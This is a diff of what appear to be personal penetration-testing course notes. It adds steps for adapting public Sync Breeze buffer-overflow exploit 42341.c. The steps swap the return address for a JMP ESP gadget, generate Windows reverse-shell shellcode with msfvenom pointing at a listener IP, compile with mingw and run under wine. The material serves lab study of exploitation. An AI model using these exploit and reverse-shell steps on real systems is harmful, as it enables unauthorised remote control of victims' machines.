@@ -604,8 +604,37 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - compile the code into a Windows Portable Executable (PE)
   - `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe` > error
   - `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32` : missing linker to find the winsock library (fixed)
-- ddd
-- dd
+- Fixing the exploit
+  - JSM ESP: ESP (Extended Stack Pointer) points to the top of the stack.. A JMP ESP instruction will jump directly to your shellcode
+  - Launch "Immunity Debugger" as admin> File > Attach > syncbrs process > view menu > executable modules > verify msvbvm60.dll is not present by checking the Name and Path values
+  - modify the 42341.c
+   - `nmap -sV -p- 192.168.242.10` (check which port is used for Sync Breeze ports - default 11877)  
+   - server.sin_addr.s_addr = inet_addr("192.168.242.10");
+   - server.sin_port = htons(80);
+   - char request_one[] = "POST /login HTTP/1.1\r\n"  "Host: 192.168.50.120\r\n"  
+   - change the return address `unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll`  (refer https://www.exploit-db.com/exploits/42928)
+   - generate reverse shell payload with msfvenom (x86, c)
+     `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
+   - modify the 42341.c
+     ```
+     modify unsigned char shellcode[] = 
+	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
+	"\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
+     ```
+   - compile the code  
+     `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`  
+   - setting a breakpoint at JSM ESP: Immunity Debugger > Ctrl + G > 0x10090c83 > F2 breakpoint
+   - run the windows exploit using wine
+     ```
+     sudo dpkg --add-architecture i386
+     sudo apt update
+     sudo apt install wine winbind wine32 -y
+     wine --version
+
+     sudo wine syncbreeze_exploit.exe
+     ```
+   - application crashes and the EIP register seems to be overwritten by "0x9010090c"  
+     
 ### 15. Antivirus evasion
 ### 16. Password attacks
     - confirm ssh service running
